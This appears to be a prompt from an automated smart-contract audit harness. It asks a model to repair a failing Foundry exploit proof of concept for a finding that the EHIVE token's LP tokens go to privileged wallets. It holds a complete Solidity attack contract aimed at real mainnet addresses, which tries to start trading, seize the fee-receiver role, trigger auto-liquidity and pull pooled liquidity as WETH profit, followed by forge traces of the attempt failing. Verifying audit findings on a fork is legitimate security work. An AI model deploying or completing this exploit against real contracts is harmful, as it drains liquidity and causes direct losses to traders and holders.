You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Privileged wallets receive all LP tokens and can withdraw pooled liquidity
- claim: `startTrading()` sends the entire initial LP position to `owner()`, and `_addLiquidity()` sends all fee-funded LP tokens to `_swapFeeReceiver` instead of locking or burning them.
- impact: Whoever controls those LP tokens can remove the pool liquidity at any time and extract the paired ETH/tokens, collapsing market liquidity and imposing direct losses on traders and holders.
- exploit_paths: ["A privileged caller starts trading, receives the initial LP tokens via `addLiquidityETH(..., owner(), ...)`, then removes liquidity from the pair off-contract.", "Later fee-funded auto-liquidity mints additional LP tokens to `_swapFeeReceiver`, who can also withdraw that protocol-funded liquidity."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
}

interface IEHIVE is IERC20Like {
    function owner() external view returns (address);
    function startTrading() external;
    function updateFeeReceiver(address newWallet) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router02Like {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
}

contract TransferHelper {
    function poke(address token, address to, uint256 amount) external {
        require(IERC20Like(token).transfer(to, amount), "helper transfer failed");
    }
}

contract FlawVerifier {
    IEHIVE internal constant TARGET = IEHIVE(0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd);
    IUniswapV2Router02Like internal constant ROUTER =
        IUniswapV2Router02Like(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IWETHLike internal constant WETH = IWETHLike(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address internal constant TRIGGER_SINK = 0x1111111111111111111111111111111111111111;
    uint256 internal constant BUY_SEED_ETH = 0.001 ether;
    uint256 internal constant TRIGGER_SEED_CAP = 1e18;

    uint256 internal _profitAmount;
    uint256 internal _baselineEth;
    uint256 internal _baselineWeth;
    bool internal _executed;

    receive() external payable {}

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            _syncProfit();
            return;
        }

        _executed = true;
        _baselineEth = address(this).balance;
        _baselineWeth = WETH.balanceOf(address(this));

        address pair = _locatePair();

        _executeExploitPath0(pair);
        pair = _locatePair();

        _executeExploitPath1(pair);

        _syncProfit();
    }

    function profitToken() external pure returns (address) {
        return address(WETH);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _executeExploitPath0(address pair) internal {
        // exploit_paths[0]: a privileged caller starts trading, receives the initial LP
        // tokens via `addLiquidityETH(..., owner(), ...)`, then removes liquidity from the
        // pair off-contract. The verifier keeps that causality unchanged: first call
        // `startTrading()`, then remove LP only if this verifier is the privileged holder.
        if (pair == address(0)) {
            _attemptStartTrading();
            pair = _locatePair();
        }

        if (pair == address(0)) {
            return;
        }

        if (_isVerifierOwner()) {
            _drainAnyLpHeld(pair);
        }
    }

    function _executeExploitPath1(address pair) internal {
        // exploit_paths[1]: later fee-funded auto-liquidity mints additional LP tokens to
        // `_swapFeeReceiver`, who can also withdraw that protocol-funded liquidity.
        if (pair == address(0)) {
            pair = _locatePair();
        }
        if (pair == address(0)) {
            return;
        }

        if (!_claimFeeReceiverRole()) {
            return;
        }

        _drainAnyLpHeld(pair);

        // If the verifier holds no EHIVE, a tiny public buy is the smallest realistic way
        // to obtain tokens for a non-exempt transfer that can trigger swapBack(). This does
        // not change the finding's root cause; it only supplies the public transaction needed
        // to reach the vulnerable `_addLiquidity(..., _swapFeeReceiver, ...)` mint.
        if (TARGET.balanceOf(address(this)) == 0) {
            _buySeedTokens();
        }

        _triggerAutoLiquidity();
        _drainAnyLpHeld(pair);
    }

    function _locatePair() internal view returns (address) {
        return IUniswapV2FactoryLike(ROUTER.factory()).getPair(address(TARGET), address(WETH));
    }

    function _attemptStartTrading() internal {
        (bool ok,) = address(TARGET).call(abi.encodeWithSelector(IEHIVE.startTrading.selector));
        ok;
    }

    function _claimFeeReceiverRole() internal returns (bool ok) {
        (ok,) = address(TARGET).call(abi.encodeWithSelector(IEHIVE.updateFeeReceiver.selector, address(this)));
    }

    function _isVerifierOwner() internal view returns (bool) {
        try TARGET.owner() returns (address tokenOwner) {
            return tokenOwner == address(this);
        } catch {
            return false;
        }
    }

    function _buySeedTokens() internal {
        uint256 spend = address(this).balance;
        if (spend == 0) {
            return;
        }
        if (spend > BUY_SEED_ETH) {
            spend = BUY_SEED_ETH;
        }

        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(TARGET);

        (bool ok,) = address(ROUTER).call{value: spend}(
            abi.encodeWithSelector(
                IUniswapV2Router02Like.swapExactETHForTokensSupportingFeeOnTransferTokens.selector,
                0,
                path,
                address(this),
                block.timestamp
            )
        );
        ok;
    }

    function _triggerAutoLiquidity() internal {
        uint256 seedAmount = TARGET.balanceOf(address(this));
        if (seedAmount == 0) {
            return;
        }
        if (seedAmount > TRIGGER_SEED_CAP) {
            seedAmount = TRIGGER_SEED_CAP;
        }

        // When the privileged wallet is fee-exempt, moving EHIVE through a helper creates the
        // realistic public transfer needed to hit swapBack() and mint LP to `_swapFeeReceiver`.
        TransferHelper helper = new TransferHelper();
        if (!_safeTransfer(address(TARGET), address(helper), seedAmount)) {
            return;
        }

        (bool ok,) = address(helper).call(
            abi.encodeWithSelector(TransferHelper.poke.selector, address(TARGET), TRIGGER_SINK, seedAmount)
        );
        ok;
    }

    function _drainAnyLpHeld(address pair) internal {
        uint256 lpBalance = IERC20Like(pair).balanceOf(address(this));
        if (lpBalance == 0) {
            return;
        }

        _safeApprove(pair, address(ROUTER), 0);
        if (!_safeApprove(pair, address(ROUTER), lpBalance)) {
            return;
        }

        (bool ok,) = address(ROUTER).call(
            abi.encodeWithSelector(
                IUniswapV2Router02Like.removeLiquidityETHSupportingFeeOnTransferTokens.selector,
                address(TARGET),
                lpBalance,
                0,
                0,
                address(this),
                block.timestamp
            )
        );
        ok;
    }

    function _safeApprove(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        return ok && (ret.length == 0 || abi.decode(ret, (bool)));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        return ok && (ret.length == 0 || abi.decode(ret, (bool)));
    }

    function _syncProfit() internal {
        uint256 ethBalance = address(this).balance;
        if (ethBalance > _baselineEth) {
            WETH.deposit{value: ethBalance - _baselineEth}();
        }

        uint256 wethBalance = WETH.balanceOf(address(this));
        if (wethBalance > _baselineWeth) {
            _profitAmount = wethBalance - _baselineWeth;
        } else {
            _profitAmount = 0;
        }
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.31s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 91508)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 3124

Traces:
  [91508] FlawVerifierTest::testExploit()
    ├─ [167] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [51369] FlawVerifier::executeOnOpportunity()
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [252] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::factory() [staticcall]
    │   │   └─ ← [Return] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0xAE851769593AC6048D36BC123700649827659A82
    │   ├─ [2589] 0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd::owner() [staticcall]
    │   │   └─ ← [Return] 0x31e180e06D771dbAfa3D6Eea452195Ad1020fbDb
    │   ├─ [252] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::factory() [staticcall]
    │   │   └─ ← [Return] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f
    │   ├─ [564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0xAE851769593AC6048D36BC123700649827659A82
    │   ├─ [3277] 0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd::updateFeeReceiver(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   └─ ← [Revert] Caller is not the _swapFeeReceiver address nor owner.
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [167] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [287] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 17690497 [1.769e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd.updateFeeReceiver
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.70s (1.67s CPU time)

Ran 1 test suite in 1.71s (1.70s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 91508)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
